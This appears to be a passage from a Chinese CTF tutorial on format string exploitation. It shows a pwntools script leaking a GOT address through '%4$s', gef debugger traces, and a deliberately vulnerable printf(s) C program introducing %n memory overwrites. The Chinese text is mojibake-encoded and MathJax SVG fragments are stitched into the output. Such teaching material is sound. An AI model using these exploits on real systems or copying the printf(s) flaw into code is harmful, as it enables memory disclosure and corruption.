<p>ç”±0x41414141å¤„æ‰€åœ¨çš„ä½ç½®å¯ä»¥çœ‹å‡ºæˆ‘ä»¬çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€æ­£å¥½æ˜¯è¾“å‡ºå‡½æ•°çš„ç¬¬5ä¸ªå‚æ•°ï¼Œä½†æ˜¯æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬4ä¸ªå‚æ•°ã€‚æˆ‘ä»¬å¯ä»¥æ¥æµ‹è¯•ä¸€ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">âœ  leakmemory git:(master) âœ— ./leakmemory<br><span class="hljs-meta">%</span><span class="bash">4<span class="hljs-variable">$s</span></span><br>00000001.22222222.ffffffff.%4$s<br>[1]    61439 segmentation fault (core dumped)  ./leakmemory<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬çš„ç¨‹åºå´©æºƒäº†ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºæˆ‘ä»¬è¯•å›¾å°†è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰€å¯¹åº”çš„å€¼ä½œä¸ºåœ°å€è¿›è¡Œè§£æï¼Œä½†æ˜¯æ˜¾ç„¶è¯¥å€¼æ²¡æœ‰åŠæ³•ä½œä¸ºä¸€ä¸ªåˆæ³•çš„åœ°å€è¢«è§£æï¼Œï¼Œæ‰€ä»¥ç¨‹åºå°±å´©æºƒäº†ã€‚å…·ä½“çš„å¯ä»¥å‚è€ƒä¸‹é¢çš„è°ƒè¯•ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"> â†’ 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   â†³  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ stack ]â”€â”€â”€â”€<br>[&#x27;0xffffcd0c&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffcd0câ”‚+0x00: 0x080484ce  â†’  &lt;main+99&gt; add esp, 0x10	 â† $esp<br>0xffffcd10â”‚+0x04: 0xffffcd20  â†’  &quot;%4$s&quot;<br>0xffffcd14â”‚+0x08: 0xffffcd20  â†’  &quot;%4$s&quot;<br>0xffffcd18â”‚+0x0c: 0x000000c2<br>0xffffcd1câ”‚+0x10: 0xf7e8b6bb  â†’  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd20â”‚+0x14: &quot;%4<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.222ex" height="2.176ex" style="vertical-align: -0.338ex;" viewbox="0 -791.3 2248.3 936.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">s"	 â† </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"/>
<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"/>
<path stroke-width="1" id="E1-MJMAIN-2190" d="M944 261T944 250T929 230H165Q167 228 182 216T211 189T244 152T277 96T303 25Q308 7 308 0Q308 -11 288 -11Q281 -11 278 -11T272 -7T267 2T263 21Q245 94 195 151T73 236Q58 242 55 247Q55 254 59 257T73 264Q121 283 158 314T215 375T247 434T264 480L267 497Q269 503 270 505T275 509T288 511Q308 511 308 500Q308 493 303 475Q293 438 278 406T246 352T215 315T185 287T165 270H929Q944 261 944 250Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-73" x="0" y="0"/>
<g transform="translate(747,0)">
 <use xlink:href="#E1-MJMAIN-22"/>
 <use xlink:href="#E1-MJMAIN-2190" x="500" y="0"/>
</g>
</g>
</svg>eax<br>0xffffcd24â”‚+0x18: 0xffffce00  â†’  0x00000000<br>0xffffcd28â”‚+0x1c: 0x000000e0<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ trace ]â”€â”€â”€â”€<br><span class="hljs-meta">[#</span><span class="bash">0] 0xf7e44670 â†’ Name: __printf(format=0xffffcd20 <span class="hljs-string">&quot;%4<span class="hljs-variable">$s</span>&quot;</span>)</span><br><span class="hljs-meta">[#</span><span class="bash">1] 0x80484ce â†’ Name: main()</span><br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>gefâ¤  help x/<br>Examine memory: x/FMT ADDRESS.<br>ADDRESS is an expression for the memory address to examine.<br>FMT is a repeat count followed by a format letter and a size letter.<br>Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal),<br>  t(binary), f(float), a(address), i(instruction), c(char), s(string)<br>  and z(hex, zero padded on the left).<br>Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).<br>The specified number of objects of the specified size are printed<br>according to the format.<br><br>Defaults for format and size letters are those previously used.<br>Default count is 1.  Default address is following last thing printed<br>with this command or &quot;print&quot;.<br>gefâ¤  x/x 0xffffcd20<br>0xffffcd20:	0x73243425<br>gefâ¤  vmmap<br>Start      End        Offset     Perm Path<br>0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>0x08049000 0x0804a000 0x00000000 r-- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>0x0804a000 0x0804b000 0x00001000 rw- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>0x0804b000 0x0806c000 0x00000000 rw- [heap]<br>0xf7dfb000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fab000 0xf7fad000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fad000 0xf7fae000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fae000 0xf7fb1000 0x00000000 rw-<br>0xf7fd3000 0xf7fd5000 0x00000000 rw-<br>0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]<br>0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]<br>0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so<br>0xf7ffb000 0xf7ffc000 0x00000000 rw-<br>0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so<br>0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so<br>0xffedd000 0xffffe000 0x00000000 rw- [stack]<br>gefâ¤  x/x 0x73243425<br>0x73243425:	Cannot access memory at address 0x73243425<br></code></pre></td></tr></table></figure>

<p>æ˜¾ç„¶0xffffcd20å¤„æ‰€å¯¹åº”çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰€å¯¹åº”çš„å˜é‡å€¼0x73243425å¹¶ä¸èƒ½å¤Ÿè¢«æ”¹ç¨‹åºè®¿é—®ï¼Œæ‰€ä»¥ç¨‹åºå°±è‡ªç„¶å´©æºƒäº†ã€‚</p>
<p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬è®¾ç½®ä¸€ä¸ªå¯è®¿é—®çš„åœ°å€å‘¢ï¼Ÿæ¯”å¦‚è¯´scanf@gotï¼Œç»“æœä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿåº”è¯¥è‡ªç„¶æ˜¯è¾“å‡ºscanfå¯¹åº”çš„åœ°å€äº†ã€‚æˆ‘ä»¬ä¸å¦¨æ¥è¯•ä¸€ä¸‹ã€‚</p>
<p>é¦–å…ˆï¼Œè·å–scanf@gotçš„åœ°å€ï¼Œå¦‚ä¸‹</p>
<blockquote>
<p>è¿™é‡Œä¹‹æ‰€ä»¥æ²¡æœ‰ä½¿ç”¨printfå‡½æ•°ï¼Œæ˜¯å› ä¸ºscanfå‡½æ•°ä¼šå¯¹0aï¼Œ0bï¼Œ0cï¼Œ00ç­‰å­—ç¬¦æœ‰ä¸€äº›å¥‡æ€ªçš„å¤„ç†ï¼Œï¼Œå¯¼è‡´æ— æ³•æ­£å¸¸è¯»å…¥ï¼Œï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è¯•è¯•ã€‚ã€‚ã€‚ã€‚</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gefâ¤  got<br><br>/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemoryï¼š     æ–‡ä»¶æ ¼å¼ elf32-i386<br><br>DYNAMIC RELOCATION RECORDS<br>OFFSET   TYPE              VALUE<br>08049ffc R_386_GLOB_DAT    __gmon_start__<br>0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0<br>0804a010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0<br>0804a014 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7<br></code></pre></td></tr></table></figure>

<p>ä¸‹é¢æˆ‘ä»¬åˆ©ç”¨pwntoolsæ„é€ payloadå¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&#x27;./leakmemory&#x27;</span>)<br>leakmemory = ELF(<span class="hljs-string">&#x27;./leakmemory&#x27;</span>)<br>__isoc99_scanf_got = leakmemory.got[<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(__isoc99_scanf_got)<br>payload = p32(__isoc99_scanf_got) + <span class="hljs-string">&#x27;%4$s&#x27;</span><br><span class="hljs-built_in">print</span> payload<br>gdb.attach(sh)<br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">&#x27;%4$s\n&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(u32(sh.recv()[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>])) <span class="hljs-comment"># remove the first bytes of __isoc99_scanf@got</span><br>sh.interactive()<br><br></code></pre></td></tr></table></figure>

<p>å…¶ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨gdb.attach(sh)æ¥è¿›è¡Œè°ƒè¯•ã€‚å½“æˆ‘ä»¬è¿è¡Œåˆ°ç¬¬äºŒä¸ªprintfå‡½æ•°çš„æ—¶å€™(è®°å¾—ä¸‹æ–­ç‚¹)ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ç¬¬å››ä¸ªå‚æ•°ç¡®å®æŒ‡å‘æˆ‘ä»¬çš„scanfçš„åœ°å€ï¼Œè¿™é‡Œè¾“å‡º</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"> â†’ <span class="hljs-number">0xf7615670</span> &lt;printf+<span class="hljs-number">0</span>&gt;       call   <span class="hljs-number">0xf76ebb09</span> &lt;__x86.get_pc_thunk.ax&gt;<br>   â†³  <span class="hljs-number">0xf76ebb09</span> &lt;__x86.get_pc_thunk.ax+<span class="hljs-number">0</span>&gt; mov    eax, DWORD PTR [esp]<br>      <span class="hljs-number">0xf76ebb0c</span> &lt;__x86.get_pc_thunk.ax+<span class="hljs-number">3</span>&gt; ret<br>      <span class="hljs-number">0xf76ebb0d</span> &lt;__x86.get_pc_thunk.dx+<span class="hljs-number">0</span>&gt; mov    edx, DWORD PTR [esp]<br>      <span class="hljs-number">0xf76ebb10</span> &lt;__x86.get_pc_thunk.dx+<span class="hljs-number">3</span>&gt; ret<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ stack ]â”€â”€â”€â”€<br>[<span class="hljs-string">&#x27;0xffbbf8dc&#x27;</span>, <span class="hljs-string">&#x27;l8&#x27;</span>]<br><span class="hljs-number">8</span><br><span class="hljs-number">0xffbbf8dc</span>â”‚+<span class="hljs-number">0x00</span>: <span class="hljs-number">0x080484ce</span>  â†’  &lt;main+<span class="hljs-number">99</span>&gt; add esp, <span class="hljs-number">0x10</span>	 â† $esp<br><span class="hljs-number">0xffbbf8e0</span>â”‚+<span class="hljs-number">0x04</span>: <span class="hljs-number">0xffbbf8f0</span>  â†’  <span class="hljs-number">0x0804a014</span>  â†’  <span class="hljs-number">0xf76280c0</span>  â†’  &lt;__isoc99_scanf+<span class="hljs-number">0</span>&gt; push ebp<br><span class="hljs-number">0xffbbf8e4</span>â”‚+<span class="hljs-number">0x08</span>: <span class="hljs-number">0xffbbf8f0</span>  â†’  <span class="hljs-number">0x0804a014</span>  â†’  <span class="hljs-number">0xf76280c0</span>  â†’  &lt;__isoc99_scanf+<span class="hljs-number">0</span>&gt; push ebp<br><span class="hljs-number">0xffbbf8e8</span>â”‚+<span class="hljs-number">0x0c</span>: <span class="hljs-number">0x000000c2</span><br><span class="hljs-number">0xffbbf8ec</span>â”‚+<span class="hljs-number">0x10</span>: <span class="hljs-number">0xf765c6bb</span>  â†’  &lt;handle_intel+<span class="hljs-number">107</span>&gt; add esp, <span class="hljs-number">0x10</span><br><span class="hljs-number">0xffbbf8f0</span>â”‚+<span class="hljs-number">0x14</span>: <span class="hljs-number">0x0804a014</span>  â†’  <span class="hljs-number">0xf76280c0</span>  â†’  &lt;__isoc99_scanf+<span class="hljs-number">0</span>&gt; push ebp	 â† $eax<br><span class="hljs-number">0xffbbf8f4</span>â”‚+<span class="hljs-number">0x18</span>: <span class="hljs-string">&quot;%4$s&quot;</span><br><span class="hljs-number">0xffbbf8f8</span>â”‚+<span class="hljs-number">0x1c</span>: <span class="hljs-number">0x00000000</span><br><br></code></pre></td></tr></table></figure>

<p>åŒæ—¶ï¼Œåœ¨æˆ‘ä»¬è¿è¡Œçš„terminalä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">âœ  leakmemory git:(master) âœ— python exploit.py<br>[+] Starting local process <span class="hljs-string">&#x27;./leakmemory&#x27;</span>: pid <span class="hljs-number">65363</span><br>[*] <span class="hljs-string">&#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory&#x27;</span><br>    Arch:     i386-<span class="hljs-number">32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (<span class="hljs-number">0x8048000</span>)<br><span class="hljs-number">0x804a014</span><br>\x14\xa0\x80%<span class="hljs-number">4</span>$s<br>[*] running <span class="hljs-keyword">in</span> new terminal: /usr/<span class="hljs-built_in">bin</span>/gdb -q  <span class="hljs-string">&quot;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory&quot;</span> <span class="hljs-number">65363</span><br>[+] Waiting <span class="hljs-keyword">for</span> debugger: Done<br><span class="hljs-number">0xf76280c0</span><br>[*] Switching to interactive mode<br>[*] Process <span class="hljs-string">&#x27;./leakmemory&#x27;</span> stopped <span class="hljs-keyword">with</span> exit code <span class="hljs-number">0</span> (pid <span class="hljs-number">65363</span>)<br>[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactiv<br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ç¡®å®å¾—åˆ°äº†scanfçš„åœ°å€ã€‚</p>
<p>ä½†æ˜¯ï¼Œå¹¶ä¸æ˜¯è¯´æ‰€æœ‰çš„åç§»æœºå™¨å­—é•¿çš„æ•´æ•°å€ï¼Œå¯ä»¥è®©æˆ‘ä»¬ç›´æ¥ç›¸åº”å‚æ•°æ¥è·å–ï¼Œæœ‰æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦å¯¹æˆ‘ä»¬è¾“å…¥çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²è¿›è¡Œå¡«å……ï¼Œæ¥ä½¿å¾—æˆ‘ä»¬æƒ³è¦æ‰“å°çš„åœ°å€å†…å®¹çš„åœ°å€ä½äºæœºå™¨å­—é•¿æ•´æ•°å€çš„åœ°å€å¤„ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œç±»ä¼¼äºä¸‹é¢çš„è¿™ä¸ªæ ·å­ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">[padding][addr]<br></code></pre></td></tr></table></figure>

<p>æ³¨æ„</p>
<blockquote>
<p>æˆ‘ä»¬ä¸èƒ½ç›´æ¥åœ¨å‘½ä»¤è¡Œè¾“å…¥\x0c\xa0\x04\x08%4$sè¿™æ˜¯å› ä¸ºè™½ç„¶å‰é¢çš„ç¡®å®æ˜¯printf@gotçš„åœ°å€ï¼Œä½†æ˜¯ï¼Œscanfå‡½æ•°å¹¶ä¸ä¼šå°†å…¶è¯†åˆ«ä¸ºå¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯ä¼šå°†,x,0,cåˆ†åˆ«ä½œä¸ºä¸€ä¸ªå­—ç¬¦è¿›è¡Œè¯»å…¥ã€‚ä¸‹é¢å°±æ˜¯é”™è¯¯çš„ä¾‹å­ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">0xffffccfcâ”‚+0x00: 0x080484ce  â†’  &lt;main+99&gt; add esp, 0x10	 â† $esp<br>0xffffcd00â”‚+0x04: 0xffffcd10  â†’  &quot;\x0c\xa0\x04\x08%4$s&quot;<br>0xffffcd04â”‚+0x08: 0xffffcd10  â†’  &quot;\x0c\xa0\x04\x08%4$s&quot;<br>0xffffcd08â”‚+0x0c: 0x000000c2<br>0xffffcd0câ”‚+0x10: 0xf7e8b6bb  â†’  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10â”‚+0x14: &quot;\x0c\xa0\x04\x08%4<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.222ex" height="2.176ex" style="vertical-align: -0.338ex;" viewbox="0 -791.3 2248.3 936.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">s"	 â† </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"/>
<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"/>
<path stroke-width="1" id="E1-MJMAIN-2190" d="M944 261T944 250T929 230H165Q167 228 182 216T211 189T244 152T277 96T303 25Q308 7 308 0Q308 -11 288 -11Q281 -11 278 -11T272 -7T267 2T263 21Q245 94 195 151T73 236Q58 242 55 247Q55 254 59 257T73 264Q121 283 158 314T215 375T247 434T264 480L267 497Q269 503 270 505T275 509T288 511Q308 511 308 500Q308 493 303 475Q293 438 278 406T246 352T215 315T185 287T165 270H929Q944 261 944 250Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-73" x="0" y="0"/>
<g transform="translate(747,0)">
 <use xlink:href="#E1-MJMAIN-22"/>
 <use xlink:href="#E1-MJMAIN-2190" x="500" y="0"/>
</g>
</g>
</svg>eax<br>0xffffcd14â”‚+0x18: &quot;\xa0\x04\x08%4$s&quot;<br>0xffffcd18â”‚+0x1c: &quot;\x04\x08%4$s&quot;<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ trace ]â”€â”€â”€â”€<br><span class="hljs-meta">[#</span><span class="bash">0] 0xf7e44670 â†’ Name: __printf(format=0xffffcd10 <span class="hljs-string">&quot;\\x0c\\xa0\\x04\\x08%4<span class="hljs-variable">$s</span>&quot;</span>)</span><br><span class="hljs-meta">[#</span><span class="bash">1] 0x80484ce â†’ Name: main()</span><br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>gefâ¤  x/x 0xffffcd10<br>0xffffcd10:	0x6330785c<br></code></pre></td></tr></table></figure>
</blockquote>
<h2 id="è¦†ç›–å†…å­˜"><a href="#è¦†ç›–å†…å­˜" class="headerlink" title="è¦†ç›–å†…å­˜"></a>è¦†ç›–å†…å­˜</h2><p>ä¸Šé¢ï¼Œæˆ‘ä»¬å·²ç»å±•ç¤ºäº†å¦‚ä½•åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥æ³„éœ²æ ˆå†…å­˜ä»¥åŠä»»æ„åœ°å€å†…å­˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬æœ‰æ²¡æœ‰å¯èƒ½ä¿®æ”¹æ ˆä¸Šå˜é‡çš„å€¼å‘¢ï¼Œç”šè‡³ä¿®æ”¹ä»»æ„åœ°å€å˜é‡çš„å†…å­˜å‘¢?ç­”æ¡ˆæ˜¯å¯è¡Œçš„ï¼Œåªè¦å˜é‡å¯¹åº”çš„åœ°å€å¯å†™ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥ä¿®æ”¹å…¶å¯¹åº”çš„æ•°å€¼ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥æƒ³ä¸€ä¸‹æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„ç±»å‹</p>
<figure class="highlight haml"><table><tr><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">n</span></span>,ä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚<br></code></pre></td></tr></table></figure>

<p>é€šè¿‡è¿™ä¸ªç±»å‹å‚æ•°ï¼Œå†åŠ ä¸Šä¸€äº›å°æŠ€å·§ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ï¼Œè¿™é‡Œä»ç„¶åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œä¸€éƒ¨åˆ†ä¸ºè¦†ç›–æ ˆä¸Šçš„å˜é‡ï¼Œç¬¬äºŒéƒ¨åˆ†ä¸ºè¦†ç›–æŒ‡å®šåœ°å€çš„å˜é‡ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬ç»™å‡ºå¦‚ä¸‹çš„ç¨‹åºæ¥ä»‹ç»ç›¸åº”çš„éƒ¨åˆ†ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* example/overflow/overflow.c */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">int</span> a = <span class="hljs-number">123</span>, b = <span class="hljs-number">456</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> c = <span class="hljs-number">789</span>;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, &amp;c);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">if</span> (c == <span class="hljs-number">16</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified c.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a == <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified a for a small number.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0x12345678</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified b for a big number!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

